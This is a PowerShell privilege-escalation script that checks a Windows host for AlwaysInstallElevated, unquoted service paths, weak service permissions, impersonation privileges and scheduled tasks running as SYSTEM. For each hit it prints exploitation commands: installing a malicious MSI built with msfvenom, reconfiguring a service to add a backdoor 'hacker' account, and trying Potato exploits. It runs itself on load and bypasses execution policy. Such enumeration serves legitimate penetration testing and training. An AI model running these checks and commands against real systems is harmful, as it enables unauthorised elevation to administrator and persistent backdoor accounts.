# win_auto_privesc.ps1 - Auto-check and suggest exploits
# USAGE: powershell -ep bypass -c ". .\win_auto_privesc.ps1; Invoke-AutoPrivEsc"

function Invoke-AutoPrivEsc {
    Write-Host "[*] Starting Windows Auto-PrivEsc Check" -ForegroundColor Cyan
    
    # Check 1: AlwaysInstallElevated
    $reg1 = Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -ErrorAction SilentlyContinue
    $reg2 = Get-ItemProperty -Path "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -ErrorAction SilentlyContinue
    
    if ($reg1.AlwaysInstallElevated -eq 1 -and $reg2.AlwaysInstallElevated -eq 1) {
        Write-Host "[!] ALWAYSINSTALLELEVATED ENABLED!" -ForegroundColor Red
        Write-Host "[+] Exploit: Create malicious MSI with msfvenom" -ForegroundColor Yellow
        Write-Host "[+] Command: msiexec /quiet /qn /i C:\temp\setup.msi" -ForegroundColor Yellow
    }
    
    # Check 2: Unquoted Service Paths
    $services = Get-WmiObject win32_service | Where-Object {$_.PathName -like "* *" -and $_.PathName -notlike '"*"'} | Select-Object Name, PathName
    
    if ($services) {
        Write-Host "[!] UNQUOTED SERVICE PATHS FOUND!" -ForegroundColor Red
        foreach ($service in $services) {
            Write-Host "[+] Service: $($service.Name)" -ForegroundColor Yellow
            Write-Host "[+] Path: $($service.PathName)" -ForegroundColor Yellow
            $pathParts = $service.PathName.Split('\')
            $writablePath = $pathParts[0] + '\' + $pathParts[1]
            Write-Host "[+] Check if $writablePath is writable" -ForegroundColor Yellow
        }
    }
    
    # Check 3: Weak Service Permissions
    Write-Host "[*] Checking service permissions..." -ForegroundColor Cyan
    Get-Service | ForEach-Object {
        $name = $_.Name
        try {
            $acl = sc.exe sdshow $name 2>$null
            if ($acl -match "WD.*RP") {
                Write-Host "[!] WEAK SERVICE PERMISSIONS: $name" -ForegroundColor Red
                Write-Host "[+] Exploit: sc config $name binPath= `"cmd.exe /c net user hacker Password123! /add`"" -ForegroundColor Yellow
            }
        } catch {}
    }
    
    # Check 4: Token Privileges
    $privileges = whoami /priv 2>$null
    if ($privileges -match "SeImpersonatePrivilege|SeAssignPrimaryTokenPrivilege") {
        Write-Host "[!] POTATO EXPLOIT POSSIBLE!" -ForegroundColor Red
        Write-Host "[+] Try: JuicyPotato, RoguePotato, PrintSpoofer" -ForegroundColor Yellow
    }
    
    # Check 5: Scheduled Tasks
    $tasks = Get-ScheduledTask | Where-Object {$_.Principal.UserId -eq "SYSTEM" -and $_.State -eq "Ready"}
    if ($tasks) {
        Write-Host "[!] SCHEDULED TASKS RUNNING AS SYSTEM" -ForegroundColor Red
        $tasks | Select-Object TaskName -First 5 | ForEach-Object {
            Write-Host "[+] Task: $($_.TaskName)" -ForegroundColor Yellow
        }
        Write-Host "[+] Check if you can modify task XML files" -ForegroundColor Yellow
    }
    
    Write-Host "`n[*] Auto-check complete!" -ForegroundColor Green
}

# Auto-run
Invoke-AutoPrivEsc
